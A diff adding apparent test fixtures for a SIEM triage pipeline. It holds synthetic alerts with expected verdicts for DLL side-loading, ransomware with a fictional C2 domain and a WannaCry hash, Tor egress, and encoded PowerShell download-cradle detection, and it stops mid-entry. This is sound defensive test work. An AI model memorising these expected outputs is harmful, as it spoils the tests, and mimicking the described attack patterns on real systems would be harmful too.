@@ -1197,6 +1197,659 @@ _ENRICH_E = _j(r"""
 """)
 
 
+# ── v6 SIEM-shape payloads — vendor-native raw log formats ────────
+#
+# Ten scenarios covering the 5 SIEM raw-log shapes a downstream consumer
+# needs to correctly parse:
+#
+#   TRELLIX-A  — Trellix HX CEF (T1574.002 DLL side-loading)
+#   WIN-4672   — QRadar WinCollect LEEF v2 (Event 4672 Special Privileges)
+#   PA-SMB-A   — Palo Alto TRAFFIC CSV (outbound SMB aged-out — no real exchange)
+#   PA-SMB-B   — Palo Alto TRAFFIC CSV variant (aged-out to Tor exit)
+#   RANSOM-A   — Ransomware/APT with destructive-action IOCs
+#   RANSOM-B   — Same as A but raw source-severity is "Low" (severity-floor test)
+#   RANSOM-C   — Same as A but consumer-side severity override attempt (revert test)
+#   PSH-A      — Windows Event 4688 — legitimate admin PowerShell (should score LOW)
+#   PSH-B      — Windows Event 4688 — malicious encoded PowerShell (should score HIGH)
+#   PSH-C      — Windows Event 4688 — encoded PowerShell WITHOUT persistence artifacts
+#
+# Each raw_alert ships:
+#   raw_log.body     — the byte-identical SIEM output (CEF / LEEF / CSV / JSON)
+#   raw_log.format   — indicator so consumers know which parser to invoke
+#   parsed           — pre-parsed fields for consumers that don't want to re-parse
+#   iocs             — pattern-tagged IOC list (same convention as DEMO/ENRICH)
+#   expected_*       — what the consumer's downstream pipeline should produce
+
+_TRELLIX_A = _j(r"""
+{
+  "source": "Trellix HX",
+  "event_type": "EDR-Alert",
+  "timestamp": "2026-07-05T04:15:22Z",
+  "severity": "Critical",
+  "confidence": 90,
+  "category": "111 Endpoint Defense Evasion",
+  "qradar_categories": ["Endpoint Defense Evasion", "Malware Signature Detection"],
+  "alert": {
+    "name": "DLL side-loading — malicious signature-based detection",
+    "description": "EDR agent flagged an unsigned DLL loaded from a user-writable path (C:\\Users\\Public\\secur32.dll) by a signed agent process. Classic T1574.002 side-loading pattern. Signed process must NOT be blocked; hunt the sideloaded DLL."
+  },
+  "raw_log": {
+    "format": "CEF",
+    "syslog_wrapper": "<134>1 2026-07-05T04:15:22Z hx-collector-01 hx - - -",
+    "body": "CEF:0|FireEye|HX|4.9.0|MPS-BLOCK-Executable|Malicious Signature-Based Detection|10|externalId=EX-12345 cs1Label=Detection Type cs1=EDR Alert cs2Label=Signature Name cs2=SUSPICIOUS_DLL_SIDE_LOADING_1 cs3Label=MITRE Technique cs3=T1574.002 cs4Label=Process Name cs4=xagt.exe cs5Label=Loaded DLL Path cs5=C:\\Users\\Public\\secur32.dll cs6Label=Loaded DLL Hash MD5 cs6=b5c0e18fc4c96c1e3a67feaddbc0d34d flexString1Label=Host Agent Cert Hash flexString1=fa1b8e3c9d7e2a5f8b1c4d7e0f2a3b6c8d9e1f2a4b7c9e0d3f5a8b2c1e4d7f9a suser=admin.user dvc=192.168.5.10 dvchost=WORKSTATION-EX-04"
+  },
+  "parsed": {
+    "device_vendor": "FireEye",
+    "device_product": "HX",
+    "device_version": "4.9.0",
+    "signature_id": "MPS-BLOCK-Executable",
+    "name": "Malicious Signature-Based Detection",
+    "severity_raw": 10,
+    "external_id": "EX-12345",
+    "detection_type": "EDR Alert",
+    "signature_name": "SUSPICIOUS_DLL_SIDE_LOADING_1",
+    "mitre_technique": "T1574.002",
+    "process_name": "xagt.exe",
+    "loaded_dll_path": "C:\\Users\\Public\\secur32.dll",
+    "loaded_dll_md5": "b5c0e18fc4c96c1e3a67feaddbc0d34d",
+    "host_agent_cert_hash": "fa1b8e3c9d7e2a5f8b1c4d7e0f2a3b6c8d9e1f2a4b7c9e0d3f5a8b2c1e4d7f9a",
+    "user": "admin.user",
+    "device_ip": "192.168.5.10",
+    "device_host": "WORKSTATION-EX-04"
+  },
+  "iocs": [
+    {"type": "process", "value": "xagt.exe", "pattern": "edr_agent_process",
+     "note": "This is the EDR agent process itself — must NOT be blocked as malicious. The threat is the sideloaded DLL, not the signed loader."},
+    {"type": "file_path", "value": "C:\\Users\\Public\\secur32.dll", "pattern": "user_writable_sideload_path",
+     "note": "secur32.dll in a user-writable path is the anomaly signal. Legitimate secur32.dll lives in System32."},
+    {"type": "hash_md5", "value": "b5c0e18fc4c96c1e3a67feaddbc0d34d", "pattern": "sideloaded_dll_hash"},
+    {"type": "cert_hash", "value": "fa1b8e3c9d7e2a5f8b1c4d7e0f2a3b6c8d9e1f2a4b7c9e0d3f5a8b2c1e4d7f9a", "pattern": "agent_identity_marker",
+     "note": "Host agent certificate hash — identifier for the EDR agent installation. Must NOT be enriched as an external IOC."}
+  ],
+  "expected_iti_category_id": 111,
+  "expected_iti_category_name": "Endpoint Defense Evasion",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_artifact_mapping": [
+    {"am_name": "process", "am_value": "xagt.exe"},
+    {"am_name": "file_path", "am_value": "C:\\Users\\Public\\secur32.dll"},
+    {"am_name": "file_hash_md5", "am_value": "b5c0e18fc4c96c1e3a67feaddbc0d34d"},
+    {"am_name": "hostname", "am_value": "WORKSTATION-EX-04"},
+    {"am_name": "source_ip", "am_value": "192.168.5.10"},
+    {"am_name": "user", "am_value": "admin.user"},
+    {"am_name": "mitre_technique", "am_value": "T1574.002"}
+  ],
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_confirmed_sideload",
+  "expected_severity": "SEV1",
+  "test_notes": "Signed EDR agent (xagt.exe) hosts a sideloaded DLL. Consumer must (a) treat xagt.exe as the loader, not the payload; (b) treat secur32.dll in user-writable path as the anomaly; (c) treat the host-agent cert hash as an installation identifier, NOT an IOC to enrich; (d) trigger contain + forensic-snapshot on T1574.002. Category MUST be Endpoint Defense Evasion (111), NOT Ransomware (107) — no encryption behaviors present."
+}
+""")
+
+_WIN_4672 = _j(r"""
+{
+  "source": "QRadar WinCollect",
+  "event_type": "WindowsSecurity-4672",
+  "timestamp": "2026-07-05T04:30:00Z",
+  "severity": "High",
+  "confidence": 75,
+  "category": "118 Privileged Access",
+  "qradar_categories": ["Privileged Access", "User Behavior Analytics"],
+  "alert": {
+    "name": "Special privileges assigned to a new logon (Event 4672)",
+    "description": "Windows Event 4672 — a logon session received sensitive privileges (SeDebugPrivilege, SeBackupPrivilege, SeLoadDriverPrivilege, and 6 more). Actor is a machine account (trailing $) on an Exchange server class host — expected for network-share machine-to-machine flows."
+  },
+  "raw_log": {
+    "format": "LEEF",
+    "syslog_wrapper": "<134>1 2026-07-05T04:30:00Z qradar-collector-01 QRadar - - -",
+    "body": "LEEF:2.0|Microsoft|Windows|10.0|4672|^|devTime=2026-07-05T04:30:00Z^EventID=4672^Computer=EX-DC-01.acme.local^OriginatingComputer=EX-DC-01.acme.local^LogSource=WinCollect_DC01^DeviceType=WindowsAuthServer^Category=Special Logon^sev=6^usrName=EX-DC-01$^Domain=ACME^SecurityID=S-1-5-18^LogonType=3^LogonID=0x3E7^Privileges=SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeDelegateSessionUserImpersonatePrivilege^PluginVersion=7.3.2.55^SourceIP=10.20.30.5"
+  },
+  "parsed": {
+    "device_vendor": "Microsoft",
+    "device_product": "Windows",
+    "event_id": 4672,
+    "computer": "EX-DC-01.acme.local",
+    "log_source": "WinCollect_DC01",
+    "category_raw": "Special Logon",
+    "sev": 6,
+    "user_name": "EX-DC-01$",
+    "domain": "ACME",
+    "security_id": "S-1-5-18",
+    "logon_type": 3,
+    "logon_id": "0x3E7",
+    "privileges": [
+      "SeSecurityPrivilege",
+      "SeBackupPrivilege",
+      "SeRestorePrivilege",
+      "SeTakeOwnershipPrivilege",
+      "SeDebugPrivilege",
+      "SeSystemEnvironmentPrivilege",
+      "SeLoadDriverPrivilege",
+      "SeImpersonatePrivilege",
+      "SeDelegateSessionUserImpersonatePrivilege"
+    ],
+    "plugin_version": "7.3.2.55",
+    "source_ip": "10.20.30.5"
+  },
+  "iocs": [
+    {"type": "user", "value": "EX-DC-01$", "pattern": "machine_account_naming",
+     "note": "Trailing $ + host-name-shaped user = Windows machine account. Machine accounts holding SeDebugPrivilege is normal for domain controllers + Exchange servers."},
+    {"type": "hostname", "value": "EX-DC-01.acme.local", "pattern": "exchange_server_class_hostname",
+     "note": "The EX-DC- prefix marks this as an Exchange server. Class context matters for privilege interpretation."},
+    {"type": "ip", "value": "10.20.30.5", "pattern": "internal_corp_source",
+     "note": "Internal source IP for the logon — expected for LogonType=3 (network share)."}
+  ],
+  "expected_iti_category_id": 118,
+  "expected_iti_category_name": "Privileged Access",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_artifact_mapping": [
+    {"am_name": "user", "am_value": "EX-DC-01$"},
+    {"am_name": "hostname", "am_value": "EX-DC-01.acme.local"},
+    {"am_name": "source_ip", "am_value": "10.20.30.5"},
+    {"am_name": "logon_type", "am_value": "3"},
+    {"am_name": "logon_id", "am_value": "0x3E7"},
+    {"am_name": "event_id", "am_value": "4672"},
+    {"am_name": "domain", "am_value": "ACME"}
+  ],
+  "expected_verdict": "VERIFICATION_REQUIRED",
+  "expected_disposition": "true_positive_expected_privilege",
+  "expected_severity": "SEV1",
+  "test_notes": "Consumer must (a) recognize trailing $ + host-name-shape as machine account (not user account); (b) cite EACH named privilege in the analysis narrative (nine privileges present — narrative must not summarize as 'sensitive privileges' and drop them); (c) interpret LogonType=3 as network share (correct context for machine-to-machine flows); (d) treat PluginVersion=7.3.2.55 as the WinCollect agent version, NOT as an IOC to extract; (e) map to T1078 (valid accounts / elevation) — the EX- server class + machine account combo is expected behavior, not compromise."
+}
+""")
+
+_PA_SMB_A = _j(r"""
+{
+  "source": "Palo Alto Networks PAN-OS",
+  "event_type": "TRAFFIC-end",
+  "timestamp": "2026-07-05T05:12:44Z",
+  "severity": "Low",
+  "confidence": 40,
+  "category": "110 Network Anomaly",
+  "qradar_categories": ["Network Anomaly", "Firewall Traffic"],
+  "alert": {
+    "name": "Outbound TCP/445 session aged-out — no real exchange",
+    "description": "Palo Alto TRAFFIC log for an outbound flow to TCP/445 that App-ID could not classify (app=incomplete) and that ended aged-out with only 2 packets and 140 bytes each way. Consumer must NOT infer 'outbound SMB' from the port alone — the session died before any Layer-7 handshake happened."
+  },
+  "raw_log": {
+    "format": "PaloAlto-TRAFFIC-CSV",
+    "syslog_wrapper": "<134>1 2026-07-05T05:12:44Z pa-fw - - - 1",
+    "body": "1,2026-07-05T05:12:44Z,000000000000,TRAFFIC,end,2626,2026-07-05T05:12:44Z,192.168.247.34,20.119.84.212,103.111.84.49,20.119.84.212,WiFi-Internet-Access,,,incomplete,vsys1,DMZ-WLC-01,External,ae1.1205,ae3.50,LOG-PROFILE,2026-07-05T05:12:44Z,2440026,1,64710,445,36288,445,0x404019,tcp,allow,140,140,140,2,2026-07-05T05:12:44Z,0,any,aged-out,0,0,0,0,,fw-edge-01,from-policy,,,0,,0,,N/A,0,0,0,0,NonProxyTraffic"
+  },
+  "parsed": {
+    "type": "TRAFFIC",
+    "subtype": "end",
+    "src": "192.168.247.34",
+    "dst": "20.119.84.212",
+    "natsrc": "103.111.84.49",
+    "natdst": "20.119.84.212",
+    "rule": "WiFi-Internet-Access",
+    "srcuser": null,
+    "dstuser": null,
+    "app": "incomplete",
+    "vsys": "vsys1",
+    "from_zone": "DMZ-WLC-01",
+    "to_zone": "External",
+    "inbound_if": "ae1.1205",
+    "outbound_if": "ae3.50",
+    "sessionid": 2440026,
+    "sport": 64710,
+    "dport": 445,
+    "natsport": 36288,
+    "natdport": 445,
+    "proto": "tcp",
+    "action": "allow",
+    "bytes": 140,
+    "bytes_sent": 140,
+    "bytes_received": 140,
+    "packets": 2,
+    "packets_sent": 2,
+    "packets_received": 2,
+    "elapsed": 0,
+    "session_end_reason": "aged-out",
+    "device_name": "fw-edge-01",
+    "traffic_type": "NonProxyTraffic"
+  },
+  "iocs": [
+    {"type": "ip", "value": "20.119.84.212", "pattern": "external_destination",
+     "note": "Azure IP range. Public-TI enrichment will likely tag as Microsoft cloud — evaluate destination on its own merits, but do NOT infer SMB abuse from the port."},
+    {"type": "ip", "value": "192.168.247.34", "pattern": "internal_corp_source"},
+    {"type": "port", "value": "445", "pattern": "smb_port_no_layer7",
+     "note": "Port 445 in isolation does NOT mean SMB. This session had no Layer-7 classification (app=incomplete) and ended aged-out — no real exchange."}
+  ],
+  "expected_iti_category_id": 110,
+  "expected_iti_category_name": "Network Anomaly",
+  "expected_iti_attack_severity": "SEV4",
+  "expected_artifact_mapping": [
+    {"am_name": "source_ip", "am_value": "192.168.247.34"},
+    {"am_name": "destination_ip", "am_value": "20.119.84.212"},
+    {"am_name": "destination_port", "am_value": "445"},
+    {"am_name": "protocol", "am_value": "tcp"},
+    {"am_name": "app_id", "am_value": "incomplete"},
+    {"am_name": "session_end_reason", "am_value": "aged-out"}
+  ],
+  "expected_verdict": "BENIGN_AUTHORIZED",
+  "expected_disposition": "false_positive_no_real_exchange",
+  "expected_severity": "SEV4",
+  "test_notes": "Consumer must narrate 'session died before any real handshake — no real SMB exchange occurred' rather than 'outbound SMB detected'. Semantic pins: (a) session_end_reason=aged-out means no reset, no FIN — the connection never completed; (b) bytes_sent=140 + bytes_received=140 + packets_sent=2 + packets_received=2 = small symmetric footprint consistent with SYN+RST or SYN+ACK+SYN+RST, not payload transfer; (c) app=incomplete means Palo Alto's App-ID engine never classified the Layer-7 protocol — Port 445 alone is NOT SMB. Disposition should close as false_positive_no_real_exchange."
+}
+""")
+
+_PA_SMB_B = _j(r"""
+{
+  "source": "Palo Alto Networks PAN-OS",
+  "event_type": "TRAFFIC-end",
+  "timestamp": "2026-07-05T05:24:11Z",
+  "severity": "High",
+  "confidence": 75,
+  "category": "110 Network Anomaly",
+  "qradar_categories": ["Network Anomaly", "Tor Egress"],
+  "alert": {
+    "name": "Outbound TCP/445 aged-out to Tor exit node",
+    "description": "Same firewall shape as PA-SMB-A (aged-out, no real Layer-7 exchange) BUT the destination IP is a known Tor exit node. Enrichment identifies the destination independently of the flow content. Consumer must separate the two signals: 'no real exchange' (flow semantics) + 'destination is Tor exit' (enrichment)."
+  },
+  "raw_log": {
+    "format": "PaloAlto-TRAFFIC-CSV",
+    "syslog_wrapper": "<134>1 2026-07-05T05:24:11Z pa-fw - - - 1",
+    "body": "1,2026-07-05T05:24:11Z,000000000000,TRAFFIC,end,2626,2026-07-05T05:24:11Z,192.168.247.34,185.220.101.34,103.111.84.49,185.220.101.34,WiFi-Internet-Access,,,incomplete,vsys1,DMZ-WLC-01,External,ae1.1205,ae3.50,LOG-PROFILE,2026-07-05T05:24:11Z,2440511,1,64712,445,36290,445,0x404019,tcp,allow,140,140,140,2,2026-07-05T05:24:11Z,0,any,aged-out,0,0,0,0,,fw-edge-01,from-policy,,,0,,0,,N/A,0,0,0,0,NonProxyTraffic"
+  },
+  "parsed": {
+    "type": "TRAFFIC",
+    "subtype": "end",
+    "src": "192.168.247.34",
+    "dst": "185.220.101.34",
+    "app": "incomplete",
+    "dport": 445,
+    "proto": "tcp",
+    "action": "allow",
+    "bytes_sent": 140,
+    "bytes_received": 140,
+    "packets_sent": 2,
+    "packets_received": 2,
+    "session_end_reason": "aged-out"
+  },
+  "iocs": [
+    {"type": "ip", "value": "185.220.101.34", "pattern": "ti_tor_exit_real",
+     "note": "Real Tor exit node — TorProject directory + GreyNoise + AbuseIPDB all confirm. This is the load-bearing enrichment signal, INDEPENDENT of the aged-out flow semantics."},
+    {"type": "ip", "value": "192.168.247.34", "pattern": "internal_corp_source"},
+    {"type": "port", "value": "445", "pattern": "smb_port_no_layer7"}
+  ],
+  "expected_iti_category_id": 110,
+  "expected_iti_category_name": "Network Anomaly",
+  "expected_iti_attack_severity": "SEV2",
+  "expected_ti_sources": ["TorProject", "GreyNoise", "AbuseIPDB"],
+  "expected_verdict": "SUSPICIOUS",
+  "expected_disposition": "true_positive_requires_review",
+  "expected_severity": "SEV2",
+  "test_notes": "Two independent signals with opposite implications: (a) flow semantics: aged-out + app=incomplete + tiny symmetric bytes = no real exchange (would default to BENIGN in PA-SMB-A); (b) destination: real Tor exit IP that public TI reliably tags. Consumer must NOT auto-close as false-positive despite the aged-out signal — the Tor destination alone warrants human review. This tests whether the pipeline correctly composites 'flow-shape says nothing happened' + 'destination is Tor' → SUSPICIOUS, not either extreme."
+}
+""")
+
+_RANSOM_A = _j(r"""
+{
+  "source": "CrowdStrike Falcon (via OmniStream)",
+  "event_type": "RansomwareBehaviorDetection",
+  "timestamp": "2026-07-05T05:45:33Z",
+  "severity": "Critical",
+  "confidence": 95,
+  "category": "107 Ransomware",
+  "qradar_categories": ["Ransomware", "Malware Outbreak"],
+  "alert": {
+    "name": "Ransomware behavior — encryption + shadow-copy deletion + C2",
+    "description": "EDR observed the full ransomware kill-chain on SOLUTION-01: mass file encryption, shadow-copy deletion via vssadmin, ransom note dropped (READMEDEC.txt), C2 callback to an external IP. SHA-256 matches a known WannaCry-family sample. Consumer must trigger destructive-action approvals (contain host, block IP, block domain, block hash)."
+  },
+  "raw_log": {
+    "format": "JSON",
+    "envelope": "OmniStream ingested",
+    "body": {
+      "device_id": "sol-crowdstrike-01",
+      "device_hostname": "SOLUTION-01",
+      "detect_ts": "2026-07-05T05:45:33Z",
+      "process": {
+        "filename": "svchost.exe",
+        "cmdline": "svchost.exe -k netsvcs -p -s Schedule",
+        "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "parent_process": "explorer.exe"
+      },
+      "network": {
+        "remote_ip": "39.39.125.108",
+        "remote_port": 443,
+        "domain": "malicious-c2.badactor.example",
+        "connection_direction": "outbound"
+      },
+      "behaviors": {
+        "file_mass_encryption": true,
+        "shadow_copy_deletion": true,
+        "ransom_note_dropped": "READMEDEC.txt",
+        "encryption_extension": ".WNCRY"
+      }
+    }
+  },
+  "parsed": {
+    "device_hostname": "SOLUTION-01",
+    "device_id": "sol-crowdstrike-01",
+    "process_name": "svchost.exe",
+    "process_cmdline": "svchost.exe -k netsvcs -p -s Schedule",
+    "process_sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+    "parent_process": "explorer.exe",
+    "remote_ip": "39.39.125.108",
+    "remote_port": 443,
+    "c2_domain": "malicious-c2.badactor.example",
+    "file_mass_encryption": true,
+    "shadow_copy_deletion": true,
+    "ransom_note_dropped": "READMEDEC.txt"
+  },
+  "iocs": [
+    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+     "pattern": "ti_known_wannacry",
+     "note": "Real WannaCry-family SHA-256 — VirusTotal + AlienVault OTX + ThreatFox + MalwareBazaar all attribute. Same hash as ENRICH-A."},
+    {"type": "ip", "value": "39.39.125.108", "pattern": "external_c2_candidate",
+     "note": "External destination IP. Enrichment should attempt attribution; may or may not be pre-catalogued in public TI."},
+    {"type": "domain", "value": "malicious-c2.badactor.example", "pattern": "fictional_c2",
+     "note": "Fictional domain for the scenario — won't be catalogued by public TI, but the parsed shape (newly-observed + connecting to an external IP) is the behavioral anchor."}
+  ],
+  "expected_iti_category_id": 107,
+  "expected_iti_category_name": "Ransomware",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_artifact_mapping": [
+    {"am_name": "hostname", "am_value": "SOLUTION-01"},
+    {"am_name": "process", "am_value": "svchost.exe"},
+    {"am_name": "process_cmdline", "am_value": "svchost.exe -k netsvcs -p -s Schedule"},
+    {"am_name": "file_hash_sha256", "am_value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"},
+    {"am_name": "destination_ip", "am_value": "39.39.125.108"},
+    {"am_name": "destination_port", "am_value": "443"},
+    {"am_name": "domain", "am_value": "malicious-c2.badactor.example"}
+  ],
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_confirmed_ransomware",
+  "expected_severity": "SEV1",
+  "expected_destructive_actions": [
+    "contain_host",
+    "block_ip",
+    "block_domain",
+    "block_hash"
+  ],
+  "test_notes": "Baseline ransomware payload with all three behavioral prerequisites for the Ransomware category: file_mass_encryption + shadow_copy_deletion + ransom_note_dropped. Downstream Planner should propose 4 destructive actions (contain / block IP / block domain / block hash). Category MUST be Ransomware (107) — a category-107 verdict on a payload without encryption behaviors would be a false floor; a non-107 verdict here means the guardrail is too aggressive."
+}
+""")
+
+_RANSOM_B = _j(r"""
+{
+  "source": "CrowdStrike Falcon (via OmniStream)",
+  "event_type": "RansomwareBehaviorDetection",
+  "timestamp": "2026-07-05T05:47:11Z",
+  "severity": "Low",
+  "confidence": 50,
+  "category": "107 Ransomware",
+  "qradar_categories": ["Ransomware", "Malware Outbreak"],
+  "alert": {
+    "name": "Ransomware behavior detected — source severity understated",
+    "description": "Same ransomware kill-chain as RANSOM-A but the source sensor labelled it 'Low' severity. Consumer must apply category-floor logic: any confirmed Ransomware (Cat 107) with encryption + shadow-copy deletion + ransom-note evidence should floor to SEV2 minimum regardless of the raw source label."
+  },
+  "raw_log": {
+    "format": "JSON",
+    "envelope": "OmniStream ingested",
+    "body": {
+      "device_hostname": "SOLUTION-02",
+      "detect_ts": "2026-07-05T05:47:11Z",
+      "raw_source_severity": "Low",
+      "process": {
+        "filename": "svchost.exe",
+        "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+      },
+      "network": {
+        "remote_ip": "39.39.125.108",
+        "domain": "malicious-c2.badactor.example"
+      },
+      "behaviors": {
+        "file_mass_encryption": true,
+        "shadow_copy_deletion": true,
+        "ransom_note_dropped": "READMEDEC.txt"
+      }
+    }
+  },
+  "parsed": {
+    "raw_source_severity": "Low",
+    "device_hostname": "SOLUTION-02",
+    "process_sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+    "file_mass_encryption": true,
+    "shadow_copy_deletion": true,
+    "ransom_note_dropped": "READMEDEC.txt"
+  },
+  "iocs": [
+    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "pattern": "ti_known_wannacry"},
+    {"type": "ip", "value": "39.39.125.108", "pattern": "external_c2_candidate"},
+    {"type": "domain", "value": "malicious-c2.badactor.example", "pattern": "fictional_c2"}
+  ],
+  "expected_iti_category_id": 107,
+  "expected_iti_category_name": "Ransomware",
+  "expected_iti_attack_severity": "SEV2",
+  "expected_severity_before_floor": "Low",
+  "expected_severity": "SEV2",
+  "test_notes": "Category-floor test: the raw source labelled this ransomware event 'Low' severity, but the consumer's severity-floor policy should recognize that any Cat-107 (Ransomware) event with all three behavioral anchors present (encryption + shadow_copy_deletion + ransom_note_dropped) must floor to at least SEV2 regardless of the source label. If the final iti_attack_severity is SEV3+ (raw label wins) the floor is broken; if it's SEV2 (floor applied) the test passes."
+}
+""")
+
+_RANSOM_C = _j(r"""
+{
+  "source": "CrowdStrike Falcon (via OmniStream)",
+  "event_type": "RansomwareBehaviorDetection",
+  "timestamp": "2026-07-05T05:49:22Z",
+  "severity": "Critical",
+  "confidence": 95,
+  "category": "107 Ransomware",
+  "qradar_categories": ["Ransomware", "Malware Outbreak"],
+  "alert": {
+    "name": "Ransomware — source SEV1 to test unjustified-override revert",
+    "description": "Same ransomware payload as RANSOM-A with source severity SEV1. Tests the unjustified-override revert: if a downstream stage attempts to demote to a lower severity WITHOUT providing severity_override_reason, the consumer's revert policy should restore SEV1 and record the reverted-from value."
+  },
+  "raw_log": {
+    "format": "JSON",
+    "envelope": "OmniStream ingested",
+    "body": {
+      "device_hostname": "SOLUTION-03",
+      "detect_ts": "2026-07-05T05:49:22Z",
+      "raw_source_severity": "Critical",
+      "raw_source_severity_mapped": "SEV1",
+      "process": {
+        "filename": "svchost.exe",
+        "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+      },
+      "network": {
+        "remote_ip": "39.39.125.108",
+        "domain": "malicious-c2.badactor.example"
+      },
+      "behaviors": {
+        "file_mass_encryption": true,
+        "shadow_copy_deletion": true,
+        "ransom_note_dropped": "READMEDEC.txt"
+      }
+    }
+  },
+  "parsed": {
+    "raw_source_severity": "Critical",
+    "raw_source_severity_mapped": "SEV1",
+    "device_hostname": "SOLUTION-03",
+    "process_sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+    "file_mass_encryption": true,
+    "shadow_copy_deletion": true,
+    "ransom_note_dropped": "READMEDEC.txt"
+  },
+  "iocs": [
+    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "pattern": "ti_known_wannacry"},
+    {"type": "ip", "value": "39.39.125.108", "pattern": "external_c2_candidate"},
+    {"type": "domain", "value": "malicious-c2.badactor.example", "pattern": "fictional_c2"}
+  ],
+  "expected_iti_category_id": 107,
+  "expected_iti_category_name": "Ransomware",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_severity": "SEV1",
+  "test_scenario_override_attempt": "A downstream stage attempts to write iti_attack_severity=SEV3 with severity_override_reason='' (empty)",
+  "test_notes": "Unjustified-override revert test: the source correctly ingests as SEV1. A downstream stage (LLM classification, in this scenario) attempts to demote to SEV3 but the override_reason field is empty. The consumer's revert policy should (a) reject the unjustified demote, (b) restore SEV1, (c) populate severity_override_reverted_from='SEV3' so downstream reviewers can see the attempted-but-reverted transition. Final iti_attack_severity must be SEV1."
+}
+""")
+
+_PSH_A = _j(r"""
+{
+  "source": "QRadar WinCollect",
+  "event_type": "WindowsSecurity-4688",
+  "timestamp": "2026-07-05T06:00:00Z",
+  "severity": "Informational",
+  "confidence": 20,
+  "category": "119 Process Execution",
+  "qradar_categories": ["Process Execution", "Windows Audit"],
+  "alert": {
+    "name": "PowerShell process created — legitimate admin script",
+    "description": "Windows Event 4688 — powershell.exe created a process to run an internal Corp-IT inventory script from ProgramData. Parent is chocolatey. Legitimate patrolman-of-hosts pattern. Consumer must recognize the co-signal-absent shape and NOT inflate the score."
+  },
+  "raw_log": {
+    "format": "WindowsEventLog-4688",
+    "syslog_wrapper": "<134>1 2026-07-05T06:00:00Z winhost - - - -",
+    "body": "EventID=4688 Computer=WKS-CORP-102 ProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\CorpIT\\Scripts\\Get-Inventory.ps1 -OutputPath C:\\ProgramData\\CorpIT\\Reports\\ User=CORP\\svc_inventory ParentProcess=C:\\ProgramData\\Chocolatey\\bin\\choco.exe"
+  },
+  "parsed": {
+    "event_id": 4688,
+    "computer": "WKS-CORP-102",
+    "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\CorpIT\\Scripts\\Get-Inventory.ps1 -OutputPath C:\\ProgramData\\CorpIT\\Reports\\",
+    "user": "CORP\\svc_inventory",
+    "parent_process": "C:\\ProgramData\\Chocolatey\\bin\\choco.exe",
+    "has_encoded_command": false,
+    "has_download_cradle": false,
+    "has_lolbin_pattern": false
+  },
+  "iocs": [
+    {"type": "process", "value": "powershell.exe", "pattern": "shell_process_no_cosignal",
+     "note": "PowerShell alone is not suspicious. Must not inflate score without co-signals (encoded-command, LOLBin pattern, download cradle, or persistence artifact)."},
+    {"type": "user", "value": "CORP\\svc_inventory", "pattern": "service_account_scheduled",
+     "note": "Service account naming (svc_ prefix) — consistent with scheduled inventory task."},
+    {"type": "process_parent", "value": "choco.exe", "pattern": "package_manager_parent"}
+  ],
+  "expected_iti_category_id": 119,
+  "expected_iti_category_name": "Process Execution",
+  "expected_iti_attack_severity": "SEV5",
+  "expected_score_breakdown": {
+    "suspicious_process": 0,
+    "encoded_command": 0,
+    "lolbin_pattern": 0,
+    "note": "PowerShell present but no co-signals → shell_process_no_cosignal breadcrumb at 0 points. Score does NOT inflate."
+  },
+  "expected_verdict": "BENIGN_AUTHORIZED",
+  "expected_disposition": "false_positive_benign_admin_activity",
+  "expected_severity": "SEV5",
+  "test_notes": "Baseline for the shell-process-co-signal check. Consumer's suspicious_process scorer must return 0 for a bare powershell.exe with a -File argument, no -EncodedCommand, no -enc, no LOLBin keyword. If the total risk_score inflates on this shape, the co-signal logic is over-triggering."
+}
+""")
+
+_PSH_B = _j(r"""
+{
+  "source": "QRadar WinCollect",
+  "event_type": "WindowsSecurity-4688",
+  "timestamp": "2026-07-05T06:15:00Z",
+  "severity": "High",
+  "confidence": 88,
+  "category": "119 Process Execution",
+  "qradar_categories": ["Process Execution", "Execution", "Malware"],
+  "alert": {
+    "name": "PowerShell — encoded command with download cradle",
+    "description": "Windows Event 4688 — powershell.exe launched with -NoP -W Hidden -EncodedCommand under NT AUTHORITY\\SYSTEM parented by WmiPrvSE.exe. Decoded payload is a WebClient DownloadString cradle fetching a remote .ps1. Encoded-command + LOLBin pattern + high-privilege actor should all fire the co-signal path."
+  },
+  "raw_log": {
+    "format": "WindowsEventLog-4688",
+    "syslog_wrapper": "<134>1 2026-07-05T06:15:00Z winhost - - - -",
